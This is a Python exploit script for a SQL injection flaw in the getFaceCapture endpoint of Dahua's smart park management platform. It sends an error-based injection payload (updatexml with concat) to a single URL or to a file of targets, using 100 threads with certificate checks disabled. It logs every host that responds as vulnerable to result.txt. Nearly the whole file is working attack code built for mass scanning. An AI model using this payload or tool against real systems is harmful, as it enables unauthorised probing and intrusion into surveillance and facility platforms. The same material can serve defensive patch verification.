import requests,argparse,sys,re,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """______________  __               _______________                 _________              _____                   ____________________ 
___  __ \__  / / /  _______ _______  /___  ____/_____ _____________  ____/_____ __________  /____  _______________  ___/_  __ \__  / 
__  / / /_  /_/ /   __  __ `/  _ \  __/_  /_   _  __ `/  ___/  _ \  /    _  __ `/__  __ \  __/  / / /_  ___/  _ \____ \_  / / /_  /  
_  /_/ /_  __  /    _  /_/ //  __/ /_ _  __/   / /_/ // /__ /  __/ /___  / /_/ /__  /_/ / /_ / /_/ /_  /   /  __/___/ // /_/ /_  /___
/_____/ /_/ /_/     _\__, / \___/\__/ /_/      \__,_/ \___/ \___/\____/  \__,_/ _  .___/\__/ \__,_/ /_/    \___//____/ \___\_\/_____/
                    /____/                                                      /_/                                                  """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='大华智慧园区综合管理平台getFaceCaptureSQL注入漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload = '/portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20umd5(1)),0x7e),1)--%22%7D/extend/%7B%7D'
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
        'Upgrade-Insecure-Requests':'1',
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False,timeout=10)
        if 'c4ca4238a0b923820dcc509a6f75849b' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
                return True
        else:
            return False
    except Exception as e:
        return False
        

if __name__ == '__main__':
    main()